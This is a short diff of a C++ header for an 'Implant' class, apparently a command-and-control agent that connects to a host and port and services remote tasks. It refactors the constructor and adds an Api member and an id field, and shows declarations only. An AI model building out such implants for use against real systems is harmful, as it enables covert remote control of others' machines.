@@ -11,14 +11,17 @@
 #include <chrono>
 #include <algorithm>
 
+#include <boost/uuid/uuid.hpp>
 #include <boost/uuid/uuid_io.hpp>
+
 #include <boost/property_tree/json_parser.hpp>
 #include <boost/property_tree/ptree.hpp>
+#include "api.hpp"
 
 class Implant {
     public:
         // Our implant constructor
-        Implant(std::string host, std::string port, std::string uri);
+        Implant(std::string host, std::string port);
         // The thread for servicing tasks
         std::future<void> task_thread;
         // Our public functions that the implant exposes
@@ -27,7 +30,8 @@ class Implant {
         void service_tasks();
 
     private:
-	    const std::string host, port, uri;
+	    std::unique_ptr<Api> api = nullptr;
+        std::string id;
         bool is_running;
 
         void parse_response(const std::string& response);
